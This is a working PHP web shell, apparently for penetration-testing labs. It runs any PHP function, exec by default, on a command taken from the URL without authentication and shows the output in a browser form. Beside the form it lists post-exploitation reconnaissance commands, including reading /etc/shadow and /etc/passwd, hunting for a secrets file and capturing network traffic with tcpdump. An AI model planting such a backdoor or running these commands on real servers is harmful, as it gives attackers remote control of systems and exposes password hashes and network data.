<?php

if($_GET["function"]) {
	if($_GET["function"] == "exec") {
		$out = array();
		$_GET["function"]($_GET['cmd'], $out);
		echo implode("\n", $out); 		
	} else {
		echo $_GET["function"]($_GET['cmd']);
	}
	die();
}
?>
<style>
 * { box-sizing: border-box; }
</style>
<form id="mainform">
	<div style="width: 50%; height: 100%; float: left; box-sizing: border-box;">
		<textarea style="width: 100%;     height: 100%;" id="results"></textarea>
	</div>
	<div style="width: 50%; float: left; padding: 10px;">
		Function<br/>
		<input type="text" id="function" name="function" placeholder="function" value="exec" style="width: 100%;"><br/><br/>
		Command<br/>
		<input type="text" id="cmd" name="cmd" placeholder="Command" style="width: 100%;"><br/><br/>
		<button type="button" onclick="loadDoc();" style="width: 100%;">Submit</button><br/><br/><hr><br/><br/>
		<strong>What's the OS? What version? What architecture?</strong><br/>
		cat /etc/*-release<br/>
		uname -i<br/>
		lsb_release -a (Debian based OSs)<br/>
		<br/><strong>Who are we? Where are we?</strong><br/>
		id<br/>
		pwd<br/>
		<br/><strong>Who uses the box? What users? (And which ones have a valid shell)</strong><br/>
		cat /etc/passwd<br/>
		grep -vE "nologin|false" /etc/passwd<br/>
		<br/><strong>What's currently running on the box? What active network services are there?</strong><br/>
		ps aux<br/>
		netstat -antup<br/>
		<br/><strong>What's installed? What kernel is being used?</strong><br/>
		dpkg -l (Debian based OSs)<br/>
		rpm -qa (CentOS / openSUSE )<br/>
		uname -a<br/>
		<br/>
		<strong>Useful Commands</strong><br/>
		uname -a <br/>
		id<br/>
		cat /proc/version<br/> 
		cat /etc/issue <br/>
		ifconfig -a <br/>
		netstat -ano <br/>
		cat /etc/passwd<br/>
		cat /etc/group<br/>
		cat /etc/shadow <br/>
		cat /etc/hosts <br/>
		arp -a <br/>
		iptables -L <br/>
		crontab -l <br/>
		find . -name "network-secret.txt"<br/>
		tcpdump -i eth0 -w capture -n -U -s 0 src not 10.11.0.X and dst not 10.11.0.X<br/>
		tcpdump -vv -i eth0 src not 10.11.0.X and dst not 10.11.0.X<br/>

	</div>
</form>
<script>
function loadDoc() {
  var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange = function() {
    if (xhttp.readyState == 4 && xhttp.status == 200) {

     document.getElementById('results').value = document.getElementById('results').value+"\n\n"+"FUNCTION: "+document.getElementById('function').value+"\n"+"CMD: "+document.getElementById('cmd').value+"\n\n"+xhttp.responseText;
     document.getElementById('results').scrollTop = document.getElementById('results').scrollHeight;
    }
  };
  xhttp.open("GET", "shell.php?function="+encodeURIComponent(document.getElementById('function').value)+"&cmd="+encodeURIComponent(document.getElementById('cmd').value), true);
  xhttp.send();
}
</script>
